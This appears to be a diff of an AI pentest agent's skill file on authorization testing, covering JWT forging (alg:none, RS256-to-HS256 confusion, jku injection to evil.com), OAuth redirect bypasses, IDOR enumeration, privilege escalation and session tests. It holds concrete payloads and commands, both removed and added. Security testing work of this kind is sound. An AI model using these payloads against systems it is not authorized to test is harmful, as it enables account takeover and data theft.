@@ -1,4 +1,4 @@
----
+﻿---
 name: authorization
 description: "Authorization testing for broken access control, IDOR, privilege escalation, and session management"
 category: specialized
@@ -39,237 +39,206 @@ compositionRules:
 Before making HTTP requests, call **getCapturedHeaders** with the target URL and role to get real headers. Pass these in the `headers` parameter of httpRequest.
 
 Decision tree for auth mechanism:
-```
-Is there a session cookie?
-  YES → Use cookie-based auth, test session fixation/timeout
-  NO  → Is there an Authorization header?
-         YES → Is it "Bearer <token>"?
-                YES → Decode token, determine JWT vs opaque
-                NO  → Basic/API-key → test key scoping
-         NO  → Is there OAuth redirect flow?
-                YES → Test OAuth endpoints
-                NO  → Check for CSRF tokens, custom headers
-```
+
+1. **Check response headers** for auth indicators:
+   - `Set-Cookie` with session token → Session-based auth
+   - `Authorization: Bearer <token>` → JWT or opaque token
+   - `X-Auth-Token` / `X-API-Key` → Custom token auth
+   - Redirect to login page with `code` / `state` params → OAuth/OIDC
+2. **Inspect token structure**:
+   - Three dot-separated base64 segments → JWT
+   - Random string (32+ chars) → Opaque session token
+   - SAML XML assertion → SAML-based
+3. **Test token validation**:
+   - Modify payload → send → does server reject?
+   - Expire the token → does server enforce expiry?
+   - Remove signature → does server still accept?
+4. **Determine validation location**:
+   - Stateless JWT: server validates signature locally (check for `jwks_uri` or embedded public key)
+   - Session token: server looks up in database (check for session store side effects)
+   - OAuth token: server introspects at authorization server endpoint
 
 ## JWT Attack Techniques
 
 ### Decode and Inspect
 
-```bash
-echo "eyJhbGciOiJSUzI1NiIs..." | base64 -d 2>/dev/null | python3 -m json.tool
-```
+1. Split the token on `.` — header (alg, kid, jku), payload (claims), signature
+2. Base64-decode each segment; look for: `alg`, `kid`, `jku`, `x5u`, `typ`, `iss`, `aud`, `exp`, `sub`
+3. Check if `alg` matches what the server expects (e.g., server says RS256 in JWKS but token uses HS256)
+4. Look for weak claims: missing `aud`, overly broad `iss`, no `exp`, or `nbf` far in the past
 
 Use **httpRequest** to call a JWKS endpoint if discovered:
-```bash
-curl -s https://target.com/.well-known/jwks.json | python3 -m json.tool
+
 ```
+GET /.well-known/jwks.json
+GET /oauth2/certs
+GET /.well-known/openid-configuration  → extract "jwks_uri" value
+```
+
+Fetch the JWKS, extract the key matching the token's `kid`, and check if it's RSA (RS256) or symmetric (oct).
 
 ### Algorithm Confusion (RS256 → HS256)
 
 When server uses RS256 but accepts HS256, sign with the public key as HMAC secret:
 
-```bash
-# Extract public key
-openssl rsa -pubin -in pubkey.pem -outform PEM > pubkey_raw.pem
+1. Fetch the public key from `jwks_uri` (the full PEM or the `n`/`e` values from the JWK)
+2. Set the JWT header `alg` to `HS256`
+3. Use the RSA public key (PEM string) as the HMAC signing secret
+4. Server verifies the HMAC using the same public key — it matches because it uses the public key for both signature verification and HMAC verification
+5. Sign with a tool: `jwt_tool.py -X k -S HS256 -k public.pem`
 
-# Forge HS256 token using public key as secret
-python3 -c "
-import hmac, hashlib, base64, json
-header = base64.urlsafe_b64encode(json.dumps({'alg':'HS256','typ':'JWT'}).encode()).rstrip(b'=')
-payload = base64.urlsafe_b64encode(json.dumps({'sub':'admin','role':'admin','exp':9999999999}).encode()).rstrip(b'=')
-sig = hmac.new(open('pubkey_raw.pem').read().encode(), header + b'.' + payload, hashlib.sha256).digest()
-print((header + b'.' + payload + b'.' + base64.urlsafe_b64encode(sig).rstrip(b'=')).decode())
-"
-```
+Indicators: server returns a valid response for an HS256-signed token using the RS256 public key.
 
 ### alg:none Attack
 
 Strip signature entirely, set alg to none:
 
-```bash
-# Forged token (no signature)
-TOKEN="eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiIsImV4cCI6OTk5OTk5OTk5OX0."
-
-curl -H "Authorization: Bearer $TOKEN" https://target.com/api/admin
-```
+1. Decode the JWT, keep header and payload
+2. Set `alg` to `none` in header
+3. Remove the signature segment (keep the trailing dot): `header.payload.`
+4. Send the token in the `Authorization: Bearer` header
+5. If the server accepts it → critical vulnerability
 
 If server rejects `none`, try mixed-case bypass:
 - `None`, `NONE`, `nOnE`, `null`, `NaN`
+- Some libraries only check lowercase `none` exactly
 
 ### jku / x5u Header Injection
 
 If server validates JWT via JKU (JWK Set URL) or X5U:
 
-```bash
-# Host malicious JWKS on attacker-controlled server
-# jku: "https://attacker.com/jwks.json"
-# x5u: "https://attacker.com/cert.pem"
+1. Host your own JWKS at an attacker-controlled URL (e.g., `https://evil.com/jwks.json`)
+2. Generate an RSA key pair for your malicious JWKS
+3. Modify the JWT header: set `jku` to your URL
+4. Sign the token with your private key
+5. Server fetches your JWKS, finds the matching key, and validates your forged token
+6. Same technique works for `x5u` (X.509 certificate URL)
 
-# Then modify header to point to attacker's key set
-python3 -c "
-import base64, json
-header = {'alg':'RS256','typ':'JWT','jku':'https://attacker.com/jwks.json'}
-print(base64.urlsafe_b64encode(json.dumps(header).encode()).rstrip(b'='))
-"
-```
+Additional tricks:
+- Try `jku: //evil.com/jwks.json` (protocol-relative bypass)
+- Try `jku: https://evil.com%40real-server.com/jwks.json` (URL parsing confusion)
+- If server uses `new URL(jku)`, test `jku: https://evil.com\@real-server.com/` (backslash confusion on some parsers)
 
 ### Token Manipulation Payloads
 
-```bash
-# Modify claims
-# Change sub from user to admin
-python3 -c "
-import base64, json
-payload = base64.urlsafe_b64decode('eyJzdWIiOiJ1c2VyMjM0In0=')
-data = json.loads(payload)
-data['sub'] = 'admin'
-data['role'] = 'admin'
-data['isAdmin'] = True
-data['exp'] = 9999999999
-print(base64.urlsafe_b64encode(json.dumps(data).encode()).rstrip(b'='))
-"
-
-# Remove exp claim (token never expires)
-# Remove signature entirely (alg:none)
-
-# Replay expired token with modified exp
-curl -H "Authorization: Bearer <expired_token_with_new_exp>" https://target.com/api/me
-```
+- **Role escalation**: Change `"role": "user"` → `"role": "admin"` in payload
+- **User impersonation**: Change `"sub": "12345"` → `"sub": "admin"` or `"sub": "1"`
+- **Audience bypass**: Change `"aud": "internal-api"` → `"aud": "public-api"` if server uses multiple validation paths
+- **Expiry extension**: Change `"exp": 1700000000` → `"exp": 9999999999`
+- **Issuer spoofing**: Change `"iss": "app"` → `"iss": "app-admin"` if issuer controls role assignment
+- **Claims injection**: Add `"admin": true`, `"permissions": ["*"]`, `"email": "admin@target.com"`
 
 ### Weak Secret Brute Force
 
-```bash
-# Using hashcat
-hashcat -m 16500 jwt.txt wordlist.txt --force
+If `alg` is HS256/HS384/HS512, brute force the signing secret:
 
-# Using jwt_tool
-python3 jwt_tool.py <token> -C -d wordlist.txt
-
-# Common secrets to try manually
-for secret in secret password key "123456" supersecret jwt_secret change-me; do
-  python3 jwt_tool.py <token> -X k -p "$secret" -t https://target.com/api/validate
-done
-```
+1. Try common secrets: `secret`, `password`, `key`, `jwt-secret`, `changeme`, app name
+2. Try wordlist attack with `hashcat -m 16500 jwt.txt wordlist.txt`
+3. Try `jwt_tool.py -X s -S HS256 -p common-passwords.txt`
+4. If token is issued by the app (not external IdP), the secret may be in source code, config files, or environment variables
 
 ### Key Confusion Detection
 
 If you see `kid` (Key ID) in JWT header:
-```bash
-# Test path traversal in kid
-# Modify kid to: ../../dev/null, or ../../proc/self/environ
-python3 -c "
-import base64, json
-header = {'alg':'HS256','typ':'JWT','kid':'../../dev/null'}
-print(base64.urlsafe_b64encode(json.dumps(header).encode()).rstrip(b'='))
-"
-```
+
+1. The server uses `kid` to select the verification key from its JWKS
+2. Test **path traversal**: set `kid` to `../../dev/null` — some servers read the key file by path and `/dev/null` is empty, causing HMAC verification with empty key
+3. Test **SQL injection in kid**: `kid': ' OR '1'='1' --` if the server stores keys in a database
+4. Test **known key override**: if the JWKS has multiple keys, pick a weaker one (e.g., RSA-256 instead of RSA-4096)
 
 ### JWT Tool Commands
 
 ```bash
-# Decode
-python3 jwt_tool.py <token> -X d
+# Decode JWT
+jwt_tool.py <token>
 
 # Tamper claims
-python3 jwt_tool.py <token> -X t -S hs256 -p "secret"
+jwt_tool.py <token> -T -S HS256 -p "your-secret"
 
 # Test alg:none
-python3 jwt_tool.py <token> -X n
+jwt_tool.py <token> -X k -S none
 
-# Brute force
-python3 jwt_tool.py <token> -C -d rockyou.txt
+# Brute force HS256
+jwt_tool.py <token> -X s -S HS256 -p wordlist.txt
 
-# Verify token against JWKS
-python3 jwt_tool.py <token> -j https://target.com/.well-known/jwks.json
+# Fetch JWKS and verify
+jwt_tool.py <token> -j <jwks_uri>
+
+# Forge token with custom claims
+jwt_tool.py -I -pc role -pv admin -S HS256 -p "secret"
+
+# Test JKU injection
+jwt_tool.py <token> -X u -pk attacker-jwks.pem -S RS256
 ```
 
 ## OAuth Testing
 
 ### Redirect URI Bypass
 
-```bash
-# Open redirect test
-curl -v "https://target.com/authorize?client_id=abc&redirect_uri=https://attacker.com/callback&response_type=code"
-
-# URI manipulation tricks
-# Add attacker subdomain
-redirect_uri=https://target.com.attacker.com/callback
-# Path traversal
-redirect_uri=https://target.com/../../../attacker.com/callback
-# URL encoding
-redirect_uri=https%3A%2F%2Fattacker.com%2Fcallback
-# Wildcard in registered URI
-redirect_uri=https://target.com/*  → try https://target.com/@attacker
-# @ injection
-redirect_uri=https://target.com@attacker.com/callback
-```
+1. **Exact match bypass**: If server uses prefix matching, try:
+   - `https://app.com/callback` → `https://app.com/callback/../admin`
+   - `https://app.com/callback` → `https://app.com/callback?extra=/admin`
+   - `https://app.com/callback` → `https://app.com/callback/` (trailing slash)
+2. **Subdomain wildcard**: If server allows `*.app.com`:
+   - Register `evil-app.com` or use `attacker.app.com`
+   - Test `https://attacker.app.com/callback`
+3. **Protocol confusion**: Test `http://app.com/callback` when `https://app.com/callback` is registered
+4. **Domain confusion**: `https://app.com.evil.com` (subdomain of attacker domain)
+5. **Port manipulation**: `https://app.com:443/callback` vs `https://app.com:8443/callback`
+6. **Fragment bypass**: `https://app.com/callback#evil` — some servers strip fragments before comparison
+7. **Open redirect chain**: `https://app.com/callback → /login?next=https://evil.com` → if the IdP follows the redirect, the auth code goes to attacker
 
 ### CSRF in OAuth Flow
 
-```bash
-# Initiate OAuth flow without state parameter
-# If state is missing, CSRF is possible
-
-# Craft malicious link
-<a href="https://target.com/authorize?client_id=abc&redirect_uri=https://attacker.com/callback&response_type=code">
-  Click to login
-</a>
-```
+1. Check if the OAuth flow uses `state` parameter:
+   - No `state` → CSRF vulnerability: attacker can initiate a login with their account, link it to victim's session
+   - `state` present but static/predictable → same issue
+2. Test: Intercept the OAuth authorize URL, remove the `state` parameter, complete the flow. If it succeeds → CSRF present
+3. Check if `state` is validated on callback (not just present)
+4. **Login CSRF**: Register an attacker account with victim's email → victim logs in → attacker's account linked to victim
 
 ### Scope Escalation
 
-```bash
-# Request higher privilege scopes
-curl -X POST "https://target.com/oauth/token" \
-  -d "grant_type=authorization_code" \
-  -d "code=AUTH_CODE" \
-  -d "scope=read write admin delete"
-
-# Check if scope is validated server-side
-```
+1. Intercept the authorization request and modify `scope` parameter:
+   - `openid profile` → `openid profile email admin api:write`
+   - Add scopes not requested originally
+2. Check if the token response includes all requested scopes or only what was authorized
+3. Test with over-requested scopes: `scope=read write admin delete`
+4. Check if scope validation happens server-side (token introspection) or if the client trusts the token's scope claim
+5. If the authorization server has a scope approval page, check if modifying scope post-approval affects the token
 
 ### Authorization Code Interception
 
-```bash
-# PKCE bypass: if code_verifier is not validated
-# Replay authorization code with different code_verifier
-
-# Token exchange with stolen code
-curl -X POST "https://target.com/oauth/token" \
-  -d "grant_type=authorization_code" \
-  -d "code=STOLEN_CODE" \
-  -d "redirect_uri=https://attacker.com/callback"
-```
+1. **Code replay**: Use the same authorization code twice — first exchange should work, second should fail
+2. **Code injection**: Modify the `code` parameter in the callback before token exchange
+3. **Code fixation**: Force a specific code value into the flow (if server accepts client-provided codes)
+4. **PKCE bypass**: If PKCE is not enforced:
+   - Steal the authorization code and exchange it without the code_verifier
+   - If PKCE is enforced but weak (e.g., short code_verifier), test brute force
+5. **Redirect interception**: Capture the code from the redirect URL (it's in the query string)
 
 ### Token Leakage via Referrer
 
-```bash
-# If token is in URL (implicit flow), check if Referer leaks it
-# Set up: https://attacker.com/page-with-link-to-protected-resource
-# Token in fragment: https://target.com/callback#access_token=TOKEN
-# Referrer header will contain token if page navigates
-```
+1. Check if tokens appear in URLs (query parameters):
+   - `https://app.com/callback?access_token=xyz`
+   - If a page includes an external link or image, the token leaks via Referer header
+2. Check if the callback URL retains the token after exchange
+3. Test: Load a page that has an external `<img>` or `<a>` tag, check if Referer header contains the token
+4. Check for tokens in JavaScript-accessible storage: `localStorage`, `sessionStorage`, `document.cookie`
+5. Check for tokens in browser history (URL bar)
 
 ## IDOR Automation
 
 ### Pattern Recognition
 
-```bash
-# Sequential IDs
-/api/users/100 → /api/users/101 → /api/users/102
-/api/orders/5000 → /api/orders/5001
+IDOR typically appears in these parameter patterns:
 
-# UUID patterns (if leaked in responses)
-/api/files/550e8400-e29b-41d4-a716-446655440000
-/api/files/660e8400-e29b-41d4-a716-446655440001
-
-# Numeric in body
-{"userId": 1234} → {"userId": 1235}
-{"orderId": 9876} → {"orderId": 9877}
-
-# Composite IDs
-/api/items?user_id=123&item_id=456 → swap user_id only, then item_id only
-```
+- **Path parameters**: `/api/users/12345` → change `12345` to `12346`
+- **Query parameters**: `?user_id=abc` → change to `?user_id=def`
+- **Request body**: `{"id": 100}` → `{"id": 101}`
+- **Headers**: `X-User-Id: 100` → `X-User-Id: 101`
+- **Encoded values**: UUID (`550e8400-e29b...`), numeric ID, base64-encoded ID
+- **Composite keys**: `?file=user1/document.pdf` → `?file=user2/document.pdf`
 
 ### IDOR Test Protocol
 
@@ -282,36 +251,35 @@ curl -X POST "https://target.com/oauth/token" \
 
 ### Bulk IDOR Enumeration
 
-```bash
-# Test range of IDs
-for i in $(seq 100 200); do
-  curl -s -H "Authorization: Bearer $USER_A_TOKEN" \
-    "https://target.com/api/users/$i/profile" | \
-    python3 -c "import sys,json; d=json.load(sys.stdin); print(f'ID {$i}: {d.get(\"name\",\"?\")}');"
-done
-```
+1. Capture a request that lists objects: `/api/users/12345/orders`
+2. Extract the object ID pattern (numeric: iterate ±100; UUID: note the format)
+3. Automate with a loop:
+   - For numeric IDs: iterate from `id-100` to `id+100`
+   - For UUIDs: capture UUIDs from another endpoint (e.g., user list) and replay
+4. Check response differences:
+   - 200 with data → IDOR
+   - 403 with same-length response → access control present (good)
+   - 404 → ID doesn't exist (not IDOR)
+   - Different response size → possible data leak
 
 ### IDOR via API Versioning
 
-```bash
-# v1 endpoint may have auth, v2 may not
-curl -H "Authorization: Bearer $TOKEN" https://target.com/api/v1/users/123
-curl https://target.com/api/v2/users/123  # Check without auth
-
-# Different endpoint formats
-/api/users/123  →  /api/user/123  →  /api/users?id=123
-```
+1. Test `/api/v1/users/123` → `/api/v2/users/123` (newer version may skip auth checks)
+2. Test `/api/internal/users/123` vs `/api/public/users/123`
+3. Test with different `Accept` headers:
+   - `Accept: application/json` vs `Accept: text/html` — different versions may have different auth
+4. Test with `X-API-Version: 1` header — version via header may bypass path-based checks
 
 ### Parameter Pollution
 
-```bash
-# Duplicate params
-/api/users?user_id=123&user_id=456
-# Different param names for same resource
-/api/users?userId=123
-/api/users?user=123
-/api/users?uid=123
-```
+1. Submit the same parameter twice:
+   - `?user_id=attacker&user_id=victim` — server may use the first or last
+   - Some servers use the first occurrence (attacker's), some use the last (victim's)
+2. Test in different positions:
+   - Query string: `?id=1&id=2`
+   - Body (form): `id=1&id=2`
+   - Headers: duplicate header values
+3. Check if the authorization check uses one value while the data retrieval uses another
 
 ## RBAC Testing Protocol
 
@@ -327,172 +295,111 @@ For each endpoint, test with every role:
 
 ### Test Commands
 
-```bash
-# Guest (no auth)
-curl -s -o /dev/null -w "%{http_code}" https://target.com/api/admin/users
-
-# Regular user
-curl -s -o /dev/null -w "%{http_code}" \
-  -H "Authorization: Bearer $USER_TOKEN" \
-  https://target.com/api/admin/users
-
-# Moderator
-curl -s -o /dev/null -w "%{http_code}" \
-  -H "Authorization: Bearer $MOD_TOKEN" \
-  https://target.com/api/admin/users
-
-# Admin
-curl -s -o /dev/null -w "%{http_code}" \
-  -H "Authorization: Bearer $ADMIN_TOKEN" \
-  https://target.com/api/admin/users
-```
+1. **Get captured headers for each role**:
+   ```
+   getCapturedHeaders → target URL + role="guest"
+   getCapturedHeaders → target URL + role="user"
+   getCapturedHeaders → target URL + role="admin"
+   ```
+2. **Send the same request with each role's headers**:
+   ```
+   httpRequest → same URL, headers from User role
+   httpRequest → same URL, headers from Admin role
+   httpRequest → same URL, no auth headers
+   ```
+3. **Compare responses**:
+   - Status code: 200 vs 403 vs 401
+   - Response body: different data or same generic content
+   - Response size: admin response larger → likely different data access
 
 ### Privilege Escalation Vectors
 
-```bash
-# Role parameter injection
-curl -X POST https://target.com/api/profile/update \
-  -H "Authorization: Bearer $USER_TOKEN" \
-  -d '{"name":"test","role":"admin"}'
-
-# HTTP method override
-curl -X PUT https://target.com/api/users/123/role \
-  -H "Authorization: Bearer $USER_TOKEN" \
-  -H "X-HTTP-Method-Override: PATCH" \
-  -d '{"role":"admin"}'
-
-# Header-based role override
-curl -H "X-Forwarded-For: 127.0.0.1" \
-  -H "X-Real-IP: 127.0.0.1" \
-  -H "Authorization: Bearer $USER_TOKEN" \
-  https://target.com/api/admin/dashboard
-
-# Path traversal for access control bypass
-curl -H "Authorization: Bearer $USER_TOKEN" \
-  https://target.com/api/admin/../users/123
-curl -H "Authorization: Bearer $USER_TOKEN" \
-  https://target.com/./api/admin/users
-```
+1. **Function-level**: User can call `/api/admin/create-user` even though UI hides the button
+2. **Object-level**: User A can modify User B's profile by changing `user_id` in the request
+3. **Multi-step**: Step 1 requires auth, Step 2 doesn't recheck — manipulate step 2 with elevated role
+4. **Parameter manipulation**: Change `"role": "user"` → `"role": "admin"` in profile update request
+5. **HTTP method confusion**: `GET /api/admin/users` returns 403, but `POST /api/admin/users` with JSON body bypasses
+6. **Batch operations**: Submit multiple operations in one request — admin ops mixed with user ops may not be individually checked
 
 ### Method-Based Access Control
 
-```bash
-# Test each HTTP method on admin endpoints
-for method in GET POST PUT PATCH DELETE OPTIONS HEAD TRACE; do
-  code=$(curl -s -o /dev/null -w "%{http_code}" \
-    -X "$method" \
-    -H "Authorization: Bearer $USER_TOKEN" \
-    https://target.com/api/admin/users)
-  echo "$method: $code"
-done
-```
+1. Test each endpoint with different HTTP methods:
+   - `GET /api/users` → 403
+   - `POST /api/users` → 200 (create user — no auth check)
+   - `PUT /api/users/123` → 200 (update — no auth check)
+   - `DELETE /api/users/123` → 200 (delete — no auth check)
+2. Use `OPTIONS` to discover supported methods
+3. Test `PATCH`, `HEAD`, `TRACE` — less common methods may skip auth middleware
 
 ## Session Management Testing
 
 ### Session Fixation
 
-```bash
-# Capture session before login
-PRE_SESSION=$(curl -s -c - https://target.com/login | grep -oP 'session=\K[^;]+')
-
-# Login
-curl -s -c cookies.txt -b cookies.txt \
-  -d "username=user&password=pass" https://target.com/login
-
-# Check if session changed
-POST_SESSION=$(grep session cookies.txt | awk '{print $NF}')
-
-if [ "$PRE_SESSION" = "$POST_SESSION" ]; then
-  echo "VULNERABLE: Session fixation - session not regenerated after login"
-fi
-```
+1. Request a session ID before login (unauthenticated request)
+2. Log in with valid credentials
+3. Check if the session ID changed after login:
+   - Same session ID → Session Fixation vulnerability
+   - Different session ID → Session regenerated (secure)
+4. If vulnerable: set the known session ID as a cookie before victim logs in → hijack their session
 
 ### Session Timeout
 
-```bash
-# Login and capture session
-curl -s -c cookies.txt -d "username=user&password=pass" https://target.com/login
-
-# Wait 30 minutes, then test
-sleep 1800
-curl -s -b cookies.txt https://target.com/api/me
-
-# Test idle timeout vs absolute timeout
-# Idle: resets on activity
-# Absolute: expires regardless of activity
-```
+1. Log in and note the session token and timestamp
+2. Wait for the server's idle timeout (typically 15-30 min)
+3. Make a request after the timeout — does it return 401?
+4. Test **absolute timeout**: remain active (send requests every minute) but reach the max session duration (e.g., 8 hours) — does the server enforce?
+5. Check if the token itself contains expiry (`exp` claim in JWT) — is it enforced server-side?
 
 ### Concurrent Sessions
 
-```bash
-# Session 1
-curl -s -c session1.txt -d "username=user&password=pass" https://target.com/login
-
-# Session 2 (same credentials)
-curl -s -c session2.txt -d "username=user&password=pass" https://target.com/login
-
-# Both sessions should still work? Check policy
-curl -s -b session1.txt https://target.com/api/me
-curl -s -b session2.txt https://target.com/api/me
-
-# If session 1 is invalidated → good practice
-# If both work → potential session fixation issue
-```
+1. Log in from two different browsers/locations with the same credentials
+2. Check if both sessions are active simultaneously
+3. Test if logout from one session invalidates the other
+4. Test if the server enforces a maximum number of concurrent sessions
+5. Check if new login invalidates old sessions (should be optional but recommended)
 
 ### Session Invalidation on Logout
 
-```bash
-# Login
-curl -s -c cookies.txt -d "username=user&password=pass" https://target.com/login
-
-# Logout
-curl -s -b cookies.txt https://target.com/logout
-
-# Try using old session
-curl -s -b cookies.txt https://target.com/api/me
-# Should return 401 — if returns 200, session not invalidated
-```
+1. Log in, capture the session token
+2. Log out
+3. Replay the old session token in a request
+4. If the server accepts it → Session Invalidation failure
+5. Check both frontend (cookie removal) and backend (token revocation)
+6. For JWT: check if the token is blacklisted/revoked server-side or simply discarded client-side
 
 ### Token Storage Analysis
 
-```bash
-# Check where tokens are stored
-# LocalStorage: accessible to XSS
-# HttpOnly cookie: safe from XSS
-# URL parameter: leaked via Referer
-
-# Test for token in URL
-curl -v https://target.com/callback?token=abc 2>&1 | grep -i "location:"
-
-# Test for HttpOnly flag
-curl -v https://target.com/login -d "username=user&password=pass" 2>&1 | grep -i "set-cookie"
-# Look for: HttpOnly, Secure, SameSite flags
-```
+1. Check where tokens are stored client-side:
+   - `localStorage` → XSS can steal it
+   - `sessionStorage` → XSS can steal it (but not persist across tabs)
+   - `document.cookie` → XSS can steal it (check `HttpOnly` flag)
+   - In-memory JavaScript variable → harder to extract but still vulnerable to DOM XSS
+2. Check for tokens in URL query parameters → Referer leakage
+3. Check for tokens in browser history
+4. Check for tokens cached by the browser or proxy
 
 ## Forced Browsing
 
-```bash
-# Direct URL access to admin pages
-curl -s -o /dev/null -w "%{http_code}" https://target.com/admin
-curl -s -o /dev/null -w "%{http_code}" https://target.com/admin/dashboard
-curl -s -o /dev/null -w "%{http_code}" https://target.com/admin/users
-curl -s -o /dev/null -w "%{http_code}" https://target.com/api/admin/config
-
-# Directory listing
-curl -s https://target.com/uploads/
-curl -s https://target.com/api/
-curl -s https://target.com/static/
-
-# Backup files
-curl -s -o /dev/null -w "%{http_code}" https://target.com/web.config
-curl -s -o /dev/null -w "%{http_code}" https://target.com/.env
-curl -s -o /dev/null -w "%{http_code}" https://target.com/robots.txt
-curl -s -o /dev/null -w "%{http_code}" https://target.com/sitemap.xml
-
-# Hidden endpoints from JS
-curl -s https://target.com/app.js | grep -oP '"/api/[^"]+"'
-curl -s https://target.com/bundle.js | grep -oP 'https?://[^"'\'' ]+'
-```
+1. **Directory traversal**: Access known-sensitive paths directly without authentication:
+   - `/admin`, `/dashboard`, `/internal`, `/debug`, `/api/`, `/swagger`, `/graphql`
+   - `/admin/users`, `/admin/config`, `/admin/logs`
+   - `/.env`, `/config.json`, `/package.json`, `/wp-config.php.bak`
+2. **Direct URL access**: If the app requires login but has predictable URLs:
+   - Try `/dashboard` after logging out
+   - Try `/user/profile?id=1` with no session
+   - Try `/api/users` with no auth header
+3. **Path fuzzing**: Use wordlists to discover hidden paths:
+   - Common admin paths: `/administrator`, `/admin.php`, `/cpanel`, `/phpmyadmin`
+   - API docs: `/swagger.json`, `/openapi.json`, `/api-docs`, `/graphql`
+   - Backup files: `/backup.zip`, `/db.sql`, `/dump.sql`
+4. **Response comparison**: Compare authenticated vs unauthenticated responses:
+   - Same 200 response with same body → forced browsing works
+   - 200 but body is a redirect/JS → client-side auth only (bypassable)
+   - 403 vs 404 → check which is returned for non-existent paths to determine which means "exists but forbidden"
+5. **Framework-specific paths**:
+   - Next.js: `/_next/data/`, `/api/` routes, `/__nextjs_original_stack_frames`
+   - React/Angular: `/static/js/`, `/chunk-vendors.js` — may contain hardcoded routes
+   - Spring Boot: `/actuator/env`, `/actuator/health`, `/swagger-ui.html`
 
 ## Anti-Hallucination
 
@@ -518,3 +425,24 @@ Always verify:
 - That returned data belongs to the authenticated user, not a hardcoded response
 - That session regeneration occurred after login
 - That tokens are actually validated server-side, not just present in the request
+
+## Trigger Conditions
+
+Activate on any endpoint returning user-specific data, admin panels/dashboards, API object-ID endpoints, or apps using JWT/OAuth2/SAML/session cookies — especially after capturing traffic from users with different roles. Trigger for IDOR, broken object/function-level access control, privilege escalation, and session-management flaws. Do not trigger on static assets, explicitly public endpoints, or when you have zero authenticated sessions (obtain one first).
+
+## Detection Approach
+
+Capture auth context via `getCapturedHeaders` per role. For IDOR, run the protocol: authenticate as A, capture the resource request noting all object references; replay with B's token (and without a token) — if A's data returns in B's session, horizontal IDOR; admin endpoints from a regular user = vertical. For RBAC, build a role matrix and test each endpoint per role, probing method-based and version-based access differences. For session management, test fixation (fixed session accepted post-login), timeout, concurrent sessions, and invalidation on logout. For JWT/OAuth, apply the JWT techniques (alg confusion, none, jku) and OAuth redirect/scope issues. Always verify status AND body — a 200 with generic content or a 403 from a missing endpoint are not findings.
+
+## Pitfalls
+
+- Claiming an endpoint vulnerable without sending a request to it.
+- Claiming IDOR without comparing two distinct user sessions.
+- Claiming `alg:none` JWT bypass without modifying and sending the token.
+- Claiming admin access without a response body showing admin content.
+- Assuming a 200 = bypass (check body) or a 403 = secure (may be missing endpoint).
+- Assuming auth mechanism from headers alone rather than testing validation.
+
+## Verification & Impact
+
+CONFIRMED when reproduced evidence shows cross-user/role data access (IDOR/BOLA/BFLA), accepted forged JWT, successful OAuth redirect/scope abuse, or session flaw (fixation/non-invalidation). SUSPECTED when an anomaly appears but isn't reproduced — record as candidate. Document impact by access-control class (A01 Broken Access Control, A07 Auth Failures) and severity (data exposure, privilege escalation). Capture request/response pairs, role comparisons, and token evidence via `recordEvidence`.
